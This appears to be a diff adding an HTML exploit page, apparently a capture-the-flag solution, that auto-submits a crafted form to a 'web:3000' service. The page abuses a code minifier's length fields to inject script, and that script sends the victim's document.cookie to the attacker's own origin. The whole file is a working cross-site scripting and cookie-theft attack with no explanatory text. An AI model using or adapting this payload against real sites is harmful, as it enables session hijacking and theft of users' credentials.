@@ -1,0 +1,31 @@
+<body>
+  <script>
+    const submit = (url, { minifiedCode, originalLength, minifiedLength }) => {
+      const innerHtml = `
+        <form action="${url}" method="post" target="_blank">
+          <input name="minifiedCode" value="${minifiedCode}">
+          <input name="originalLength" value="${originalLength}">
+          <input name="minifiedLength" value="${minifiedLength}">
+        </form>
+      `;
+      document.body.innerHTML += innerHtml;
+      document.forms[document.forms.length - 1].submit();
+    };
+
+    const exploit = (url, xss) => {
+      const evil = ";`*/<" + "/script>`/*";
+      const len = 93;
+      submit(url, {
+        minifiedCode: (xss + evil).padStart(len, " "),
+        originalLength: 0,
+        minifiedLength: -304 + len,
+      });
+    };
+
+    const baseUrl = "http://web:3000";
+    exploit(
+      `${baseUrl}/post#${encodeURIComponent(location.origin + "/print?cookie=")}`,
+      "location = `${decodeURIComponent(location.hash.slice(1))}${document.cookie}`"
+    );
+  </script>
+</body>
